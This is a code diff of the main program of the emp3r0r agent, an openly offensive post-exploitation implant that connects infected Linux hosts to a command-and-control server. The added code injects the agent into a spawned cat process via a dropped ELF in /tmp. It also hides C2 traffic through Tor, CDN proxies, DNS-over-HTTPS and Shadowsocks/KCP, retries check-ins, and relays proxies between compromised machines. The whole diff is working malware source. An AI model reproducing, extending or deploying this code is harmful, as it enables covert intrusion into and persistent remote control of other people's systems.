@@ -37,6 +37,18 @@ func main() {
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
+	// inject
+	err = inject_and_run()
+	if err != nil {
+		log.Print(err)
+	}
+
+	// applyRuntimeConfig
+	err = agent.ApplyRuntimeConfig()
+	if err != nil {
+		log.Fatalf("ApplyRuntimeConfig: %v", err)
+	}
+
 	// version
 	if *version {
 		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
@@ -50,10 +62,10 @@ func main() {
 	// mkdir -p UtilsPath
 	// use absolute path
 	// TODO find a better location for temp files
-	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
-		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
+	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath) {
+		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
 		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
+			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
 		}
 	}
 
@@ -66,7 +78,7 @@ func main() {
 
 		// redirect everything to log file
 		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
-			emp3r0r_data.AgentRoot),
+			agent.RuntimeConfig.AgentRoot),
 			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
 		if err != nil {
 			log.Printf("error opening emp3r0r.log: %v", err)
@@ -81,9 +93,9 @@ func main() {
 	}
 
 	// PATH
-	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", emp3r0r_data.UtilsPath))
+	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", agent.RuntimeConfig.UtilsPath))
 
-	// HOME
+	// set HOME to correct value
 	u, err := user.Current()
 	if err != nil {
 		log.Printf("Get user info: %v", err)
@@ -129,7 +141,7 @@ test_agent:
 		}
 
 		// exit, leave the existing agent instance running
-		if agent.IsAgentAlive() {
+		if isAgentAlive() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !*replace {
@@ -156,34 +168,37 @@ test_agent:
 	// start socket listener
 	go socketListen()
 
-	// parse C2 address
-	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
-	emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
-
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
+		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
+		// by default we use 443, so configure your torrc accordingly
+		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
 		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
-		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
-		emp3r0r_data.AgentProxy = *c2proxy
+		agent.RuntimeConfig.AgentProxy = *c2proxy
 		if *c2proxy == "" {
-			emp3r0r_data.AgentProxy = "socks5://127.0.0.1:9050"
+			agent.RuntimeConfig.AgentProxy = "socks5://127.0.0.1:9050"
 		}
-		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, emp3r0r_data.AgentProxy)
+		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.AgentProxy)
+	} else {
+		// parse C2 address
+		// append CCPort to CCAddress
+		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
 	}
+	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)
 
 	// if user specified a proxy, use it
 	if *c2proxy != "" {
-		emp3r0r_data.AgentProxy = *c2proxy
+		agent.RuntimeConfig.AgentProxy = *c2proxy
 	}
 
 	// DNS
 	if *doh != "" {
-		emp3r0r_data.DoHServer = *doh
+		agent.RuntimeConfig.DoHServer = *doh
 	}
-	if emp3r0r_data.DoHServer != "" {
+	if agent.RuntimeConfig.DoHServer != "" {
 		// use DoH resolver
 		net.DefaultResolver, err = dns.NewDoHResolver(
-			emp3r0r_data.DoHServer,
+			agent.RuntimeConfig.DoHServer,
 			dns.DoHCache())
 		if err != nil {
 			log.Fatal(err)
@@ -192,54 +207,37 @@ test_agent:
 
 	// if user wants to use CDN proxy
 	if *cdnProxy != "" {
-		emp3r0r_data.CDNProxy = *cdnProxy
+		agent.RuntimeConfig.CDNProxy = *cdnProxy
 	}
-	upper_proxy := emp3r0r_data.AgentProxy // when using CDNproxy
-	if emp3r0r_data.CDNProxy != "" {
-		log.Printf("C2 is behind CDN, using CDNProxy %s", emp3r0r_data.CDNProxy)
+	upper_proxy := agent.RuntimeConfig.AgentProxy // when using CDNproxy
+	if agent.RuntimeConfig.CDNProxy != "" {
+		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
 		// DoH server
 		dns := "https://9.9.9.9/dns-query"
-		if emp3r0r_data.DoHServer != "" {
-			dns = emp3r0r_data.DoHServer
+		if agent.RuntimeConfig.DoHServer != "" {
+			dns = agent.RuntimeConfig.DoHServer
 		}
 		go func() {
 			for !tun.IsProxyOK(cdnproxyAddr) {
 				// typically you need to configure AgentProxy manually if agent doesn't have internet
 				// and AgentProxy will be used for websocket connection, then replaced with 10888
-				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], emp3r0r_data.CDNProxy, upper_proxy, dns)
+				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
 				if err != nil {
 					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
 				}
 			}
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
-		emp3r0r_data.AgentProxy = cdnproxyAddr
+		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
 	}
 
 	// agent root
-	if !util.IsFileExist(emp3r0r_data.AgentRoot) {
-		err = os.MkdirAll(emp3r0r_data.AgentRoot, 0700)
+	if !util.IsFileExist(agent.RuntimeConfig.AgentRoot) {
+		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0700)
 		if err != nil {
-			log.Printf("MkdirAll %s: %v", emp3r0r_data.AgentRoot, err)
+			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
 		}
 	}
-
-	// socks5 proxy
-	go func() {
-		// start a socks5 proxy
-		err := agent.Socks5Proxy("on", "0.0.0.0:"+emp3r0r_data.ProxyPort)
-		if err != nil {
-			log.Printf("Socks5Proxy on %s: %v", emp3r0r_data.ProxyPort, err)
-			return
-		}
-		defer func() {
-			err := agent.Socks5Proxy("off", "0.0.0.0:"+emp3r0r_data.ProxyPort)
-			if err != nil {
-				log.Printf("Socks5Proxy off (%s): %v", emp3r0r_data.ProxyPort, err)
-			}
-		}()
-	}()
 
 	// do we have internet?
 	checkInternet := func(cnt *int) bool {
@@ -248,11 +246,21 @@ test_agent:
 			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
-				go agent.StartBroadcast(true, ctx, cancel)
+				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
+
+				if agent.RuntimeConfig.UseShadowsocks {
+					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+						agent.RuntimeConfig.ShadowsocksPort)
+
+					// run ss w/wo KCP
+					go agent.ShadowsocksC2Client()
+					go agent.KCPClient() // KCP client will run when UseKCP is set
+				}
 			}
 			return true
 
-		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
+		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.AgentProxy) {
 			*cnt++
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
@@ -266,8 +274,8 @@ test_agent:
 					}
 				}()
 				for ctx.Err() == nil {
-					if emp3r0r_data.AgentProxy != "" {
-						log.Printf("[+] Thank you! We got a proxy: %s", emp3r0r_data.AgentProxy)
+					if agent.RuntimeConfig.AgentProxy != "" {
+						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.AgentProxy)
 						return true
 					}
 				}
@@ -284,31 +292,36 @@ test_agent:
 	}
 
 	// apply whatever proxy setting we have just added
-	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
-	if emp3r0r_data.AgentProxy != "" {
-		log.Printf("Using proxy: %s", emp3r0r_data.AgentProxy)
+	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(agent.RuntimeConfig.AgentProxy)
+	if agent.RuntimeConfig.AgentProxy != "" {
+		log.Printf("Using proxy: %s", agent.RuntimeConfig.AgentProxy)
 	} else {
 		log.Println("Not using proxy")
 	}
 
 connect:
-	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if emp3r0r_data.IndicatorWaitMax > 0 &&
-		emp3r0r_data.CCIndicator != "" &&
-		emp3r0r_data.CCIndicatorText != "" { // check indicator URL or not
 
-		if !agent.IsCCOnline(emp3r0r_data.AgentProxy) {
+	// check preset CC status URL, if CC is supposed to be offline, take a nap
+	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
+		agent.RuntimeConfig.CCIndicator != "" &&
+		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not
+
+		if !agent.IsCCOnline(agent.RuntimeConfig.AgentProxy) {
 			log.Println("CC not online")
-			time.Sleep(time.Duration(util.RandInt(emp3r0r_data.IndicatorWaitMin, emp3r0r_data.IndicatorWaitMax)) * time.Minute)
+			time.Sleep(time.Duration(
+				util.RandInt(
+					agent.RuntimeConfig.IndicatorWaitMin,
+					agent.RuntimeConfig.IndicatorWaitMax)) * time.Minute)
 			goto connect
 		}
 	}
+	log.Printf("Checking in on %s", emp3r0r_data.CCAddress)
 
 	// check in with system info
 	err = agent.CheckIn()
 	if err != nil {
-		log.Println("CheckIn: ", err)
-		time.Sleep(5 * time.Second)
+		log.Printf("CheckIn error: %v, sleeping, will retry later", err)
+		util.TakeASnap()
 		goto connect
 	}
 	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
@@ -318,36 +331,32 @@ connect:
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	emp3r0r_data.H2Json = conn
 	if err != nil {
-		log.Println("ConnectCC: ", err)
-		time.Sleep(5 * time.Second)
+		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
+		util.TakeASnap()
 		goto connect
 	}
+	emp3r0r_data.KCPKeep = true
 	log.Println("Connected to CC TunAPI")
-	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
-		go agent.VaccineHandler()
-	}
-	err = agent.CCMsgTun(ctx, cancel)
-	if err != nil {
-		log.Printf("CCMsgTun: %v, reconnecting...", err)
-	}
+	agent.CCMsgTun(ctx, cancel)
+	log.Printf("CCMsgTun closed, reconnecting")
 	goto connect
 }
 
 // listen on a unix socket, used to check if agent is responsive
 func socketListen() {
 	// if socket file exists
-	if util.IsFileExist(emp3r0r_data.SocketName) {
-		log.Printf("%s exists, testing connection...", emp3r0r_data.SocketName)
-		if agent.IsAgentAlive() {
-			log.Fatalf("%s exists, and agent is alive, aborting", emp3r0r_data.SocketName)
+	if util.IsFileExist(agent.RuntimeConfig.SocketName) {
+		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
+		if isAgentAlive() {
+			log.Fatalf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
 		}
-		err := os.Remove(emp3r0r_data.SocketName)
+		err := os.Remove(agent.RuntimeConfig.SocketName)
 		if err != nil {
 			log.Fatalf("Failed to delete socket: %v", err)
 		}
 	}
 
-	l, err := net.Listen("unix", emp3r0r_data.SocketName)
+	l, err := net.Listen("unix", agent.RuntimeConfig.SocketName)
 	if err != nil {
 		log.Fatal("listen error:", err)
 	}
@@ -379,4 +388,50 @@ func server(c net.Conn) {
 			log.Printf("Write: %v", err)
 		}
 	}
+}
+
+func inject_and_run() (err error) {
+	// inject self to a cat process
+	// check path hash to make sure we don't get trapped in a dead loop
+	path_hash := tun.SHA256Sum(fmt.Sprintf("emp3r0r_salt:%s", os.Getenv("PATH")))
+	if path_hash == "f74980d53e01a9ca2078f3894390606d4ecc1b0fc70d284faa16043d718ad0a5" {
+		return fmt.Errorf("This process is started by injector, aborting")
+	}
+
+	// read envv
+	fd := os.Getenv("FD")
+	if fd == "" {
+		return fmt.Errorf("FD empty")
+	}
+	packed_elf_data, err := ioutil.ReadFile(fd)
+	if err != nil {
+		return fmt.Errorf("read %s: %v", fd, err)
+	} else {
+		cmd := exec.Command("/bin/cat")
+		err = cmd.Run()
+		if err != nil {
+			return
+		}
+		go func(e error) {
+			for cmd.Process != nil {
+				e = ioutil.WriteFile("/tmp/emp3r0r", packed_elf_data, 0755)
+				if e != nil {
+					break
+				}
+				e = agent.InjectSO(cmd.Process.Pid)
+				break
+			}
+		}(err)
+	}
+
+	return
+}
+
+func isAgentAlive() bool {
+	conn, err := net.Dial("unix", agent.RuntimeConfig.SocketName)
+	if err != nil {
+		log.Printf("Agent seems dead: %v", err)
+		return false
+	}
+	return agent.IsAgentAlive(conn)
 }
